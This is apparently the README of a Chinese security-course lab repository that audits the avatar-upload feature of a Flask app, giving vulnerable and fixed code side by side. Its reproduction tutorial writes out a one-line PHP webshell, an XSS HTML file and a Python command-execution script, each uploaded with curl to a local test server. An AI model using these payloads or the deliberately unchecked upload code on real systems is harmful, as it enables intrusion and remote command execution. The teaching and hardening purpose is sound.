# Flask 用户管理系统 — 文件上传安全审计

## 项目简介

本项目是一个基于 Flask + SQLite3 的用户管理系统，提供了登录、注册、用户搜索、头像上传等基础功能。本仓库在原有系统基础上，专门针对**头像上传模块**进行安全审计与加固，包含漏洞源码、修复后源码、审计报告和配套教程，适用于网络安全课程实验教学。

## 运行环境

| 项目 | 版本 |
|------|------|
| Python | 3.10+ |
| Flask | 3.x |
| 数据库 | SQLite3 |
| 模板引擎 | Jinja2 |
| 前端 | HTML5 + CSS3 |

## 部署启动步骤

### 安装依赖

```bash
pip install flask werkzeug
```

### 启动漏洞版

```bash
cd vulnerable
# 将 app_upload_section.py 合并到项目主 app.py
python app.py
# 访问 http://127.0.0.1:5000
```

### 启动修复版

```bash
cd fixed
# 将 app_upload_section.py 合并到项目主 app.py
python app.py
# 访问 http://127.0.0.1:5000
```

> 默认登录账号：admin / admin123

## 目录结构

```
file-upload-audit/
├── 1-SECURITY_AUDIT.md              # 安全审计报告
├── vulnerable/                       # 漏洞原版代码
│   ├── app_upload_section.py        # app.py 上传路由部分（漏洞版）
│   ├── upload.html                  # 上传页面模板
│   ├── base.html                    # 基础模板
│   └── index.html                   # 首页模板
├── fixed/                            # 安全修复版代码
│   ├── app_upload_section.py        # app.py 上传路由部分（修复版）
│   ├── upload.html                  # 上传页面模板
│   ├── base.html                    # 基础模板
│   └── index.html                   # 首页模板
└── README.md                         # 本文件
```

## 基础功能说明

| 路由 | 方法 | 功能 | 登录要求 |
|------|------|------|---------|
| `/` | GET | 首页，展示用户信息 | 否 |
| `/login` | GET/POST | 用户登录 | 否 |
| `/register` | GET/POST | 用户注册 | 否 |
| `/search` | GET | 搜索用户 | 是 |
| `/upload` | GET/POST | 上传头像 | 是 |
| `/logout` | GET | 退出登录 | 否 |

---

## 漏洞原版源码介绍

漏洞版代码位于 `vulnerable/` 目录，上传路由 `app_upload_section.py` 中的关键缺陷：

```python
# 漏洞1：无扩展名校验 → 可上传任何文件（.php/.py/.exe/.html）
# 漏洞2：无内容校验 → 无法判断是否为真实图片
# 漏洞3：原始文件名保存 → 同名文件互相覆盖
filename = secure_filename(file.filename)
file.save(os.path.join(UPLOAD_FOLDER, filename))
```

---

## 详细漏洞审计

详见 `1-SECURITY_AUDIT.md`，共发现 4 项漏洞：

| 编号 | 漏洞名称 | 等级 |
|------|---------|------|
| VUL-FU-01 | 任意文件上传（无后缀校验） | 高危 |
| VUL-FU-02 | 文件覆盖（同名互相覆盖） | 中危 |
| VUL-FU-03 | 无文件内容真实性校验 | 中危 |
| VUL-FU-04 | 文件体积上限过大（16MB） | 低危 |

---

## 漏洞复现操作教程

### 前置条件

启动漏洞版服务，登录获取 session cookie。

### 复现 VUL-FU-01：上传 Webshell

```bash
# 登录
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt

# 1. 上传 PHP Webshell（如服务器支持PHP解析）
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/shell.php"

# 2. 上传 HTML 钓鱼页面
echo '<script>alert("XSS")</script>' > /tmp/phish.html
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/phish.html"

# 3. 上传 Python 脚本
echo 'import os; os.system("whoami")' > /tmp/exploit.py
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/exploit.py"
```

**预期结果：** 所有非图片文件均上传成功，可通过 `/static/uploads/` 直接访问。

### 复现 VUL-FU-02：文件覆盖

```bash
# 上传 test.png
echo "file1" > /tmp/test.png
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/test.png"

# 再次上传同名 test.png（不同内容）
echo "file2-overwrite" > /tmp/test.png
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/test.png"
# test.png 的内容已被 file2 覆盖
```

### 复现 VUL-FU-03：非图片伪装上传

```bash
# 将文本文件重命名为 .png
echo "not-a-real-image" > /tmp/fake.png
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/fake.png"
# 上传成功，但实际不是图片
```

### 复现 VUL-FU-04：大文件上传

```bash
# 生成一个大文件
dd if=/dev/zero of=/tmp/bigfile.jpg bs=1M count=15
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/bigfile.jpg"
# 上传成功，存储被消耗
```

---

## 安全修复方案

修复版代码位于 `fixed/` 目录，修复措施对照表：

| 漏洞 | 修复方式 | 代码位置 |
|------|---------|---------|
| VUL-FU-01 任意文件上传 | 添加扩展名白名单 `.jpg/.jpeg/.png/.gif/.webp` | `ALLOWED_EXTENSIONS` 集合 + `ext not in` 判断 |
| VUL-FU-02 文件覆盖 | 使用 UUID 重命名 `uuid.uuid4().hex + ext` | `unique_name = f"{uuid.uuid4().hex}{ext}"` |
| VUL-FU-03 非图片伪装 | 校验文件魔术头（Magic Bytes） | `_validate_image_content()` 函数 |
| VUL-FU-04 体积过大 | 下调上限至 5MB | `app.config["MAX_CONTENT_LENGTH"] = 5*1024*1024` |

### 修复代码核心片段

```python
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp"}

def _validate_image_content(filepath):
    with open(filepath, "rb") as f:
        header = f.read(12)
    if header.startswith(b"\xff\xd8\xff"): return True   # JPEG
    if header.startswith(b"\x89PNG\r\n\x1a\n"): return True  # PNG
    if header.startswith(b"GIF87a") or header.startswith(b"GIF89a"): return True  # GIF
    if header.startswith(b"RIFF") and header[8:12] == b"WEBP": return True  # WebP
    return False

# 上传时
ext = os.path.splitext(original_name)[1].lower()
if ext not in ALLOWED_EXTENSIONS:
    return render_template("upload.html", error="不支持的文件格式")

unique_name = f"{uuid.uuid4().hex}{ext}"
file.save(save_path)

if not _validate_image_content(save_path):
    os.remove(save_path)
    return render_template("upload.html", error="文件内容无效")
```

---

## 服务器加固建议

1. **禁用脚本执行**：`static/uploads/` 目录关闭脚本执行权限（Apache 配置 `RemoveHandler`、Nginx 配置 `location ~* \.(py|php)$ { deny all; }`）
2. **单独域名/路径**：上传目录使用独立的静态资源域名，减少 Cookie 泄露风险
3. **防盗链**：配置 Referer 验证或签名 URL，防止资源被第三方滥用
4. **定期清理**：部署定时任务清理长时间未使用的上传文件
5. **WAF 防护**：部署 ModSecurity 等 WAF 检测恶意文件上传行为
6. **杀毒扫描**：上传文件落盘后调用 ClamAV 等工具扫描病毒

---

## 网络安全学习免责声明

本仓库提供的漏洞代码和 POC 测试命令仅用于 **网络安全教学与合法授权测试**。禁止将本仓库内容用于以下场景：

- 未经授权的系统测试或攻击
- 对生产环境的非法入侵
- 传播或制作恶意软件

请遵守《中华人民共和国网络安全法》及相关法律法规。**任何非法使用本仓库内容造成的法律后果由使用者自行承担。**

---

*项目维护者：网络安全实训小组 | 最后更新：2026年7月*
